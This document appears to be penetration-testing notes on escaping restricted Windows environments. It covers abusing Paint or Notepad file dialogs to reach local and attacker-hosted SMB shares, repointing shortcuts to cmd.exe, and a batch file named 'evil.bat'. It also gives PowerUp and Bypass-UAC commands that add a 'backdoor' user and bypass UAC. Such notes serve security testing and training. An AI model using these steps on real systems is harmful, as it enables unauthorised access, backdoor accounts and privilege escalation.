VM Breakout

1. Gain access to a Dialog Box
2. Exploit the Dialog Box to achieve command execution
3. Escalate privileges to gain higher levels of access

Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box.

Tools:
- Paint
- Notepad
- Wordpad

1. Start Paint
2. Click open
3. Type in "\\127.0.0.1\c$\users\pmorgan" under File name field, with all files selected.


## Accessing SMB Share from restricted environment

1. Start smb server from Ubuntu machine
```
smbserver.py -smb2support share $(pwd)
```
2. Type in "\\10.13.38.95\share" under File name field, with all files selected.


**Alternate Explorer
In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like Q-Dir or Explorer++ can be employed as a workaround.
- Explorer++: https://explorerplusplus.com/

**Alternate Registry Editors
- Simpleregedit: https://sourceforge.net/projects/simpregedit/
- Uberregedit: https://sourceforge.net/projects/uberregedit/
- SmallRegistryEditor: https://sourceforge.net/projects/sre/


## Modify existing shortcut file

1. Right-click on desired shortcut
2. Select Properties
3. Within the Target field, modify the path to the intended folder for access (C:\Windows\System32\cmd.exe)
4. Execute the Shortcut and cmd will be spawned

If there is not already a shortcut, we can transfer an existing shortcut file using an SMB server or generate a malicious .lnk file


## Script Execution

1. Create a new text file and name it "evil.bat"
2. Open 'evil.bat' with a text editor such as a Notepad.
3. Input the command 'cmd' into the file.
4. Save the file.


## Escalating Privileges
WinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
PowerUp: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
```ps
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```
```cmd
runas /user:backdoor cmd
```

**Bypassing UAC
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
```
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
whoami /all
```
